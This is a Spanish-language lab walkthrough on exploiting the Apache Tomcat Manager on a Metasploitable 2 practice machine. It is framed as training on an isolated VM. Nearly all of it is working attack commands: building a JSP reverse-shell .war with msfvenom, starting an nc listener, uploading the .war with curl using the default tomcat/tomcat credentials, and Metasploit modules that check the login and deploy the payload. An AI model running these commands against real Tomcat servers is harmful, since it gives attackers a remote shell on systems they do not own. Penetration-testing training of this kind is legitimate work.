# Apache Tomcat / Coyote (puerto 8180) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **Apache Tomcat** es un servidor de aplicaciones **Java/JSP**. En Metasploitable escucha en el **puerto 8180** y tiene activo el **Manager** (panel para desplegar aplicaciones).

**Cómo se explota:** el panel Manager (`/manager/html`) usa **credenciales por defecto** (`tomcat / tomcat`). Con acceso, se **despliega una aplicación `.war` maliciosa** (una *webshell* JSP) que da ejecución de comandos.

## Explotación manual (sin Metasploit)

```bash
# 1. Generar una webshell .war con msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.8 LPORT=4444 -f war -o shell.war

# 2. Ponte a la escucha
nc -lvp 4444

# 3. Subir el .war al Manager (credenciales tomcat/tomcat)
curl -u tomcat:tomcat -T shell.war "http://192.168.100.9:8180/manager/deploy?path=/shell&update=true"

# 4. Ejecutar la webshell abriéndola en el navegador o con curl
curl http://192.168.100.9:8180/shell/
```

## Explotación con Metasploit

```bash
# Primero comprobar las credenciales del Manager
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.100.9
set RPORT 8180
run

# Después, desplegar el payload automáticamente
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.100.9
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 192.168.100.8
run
```
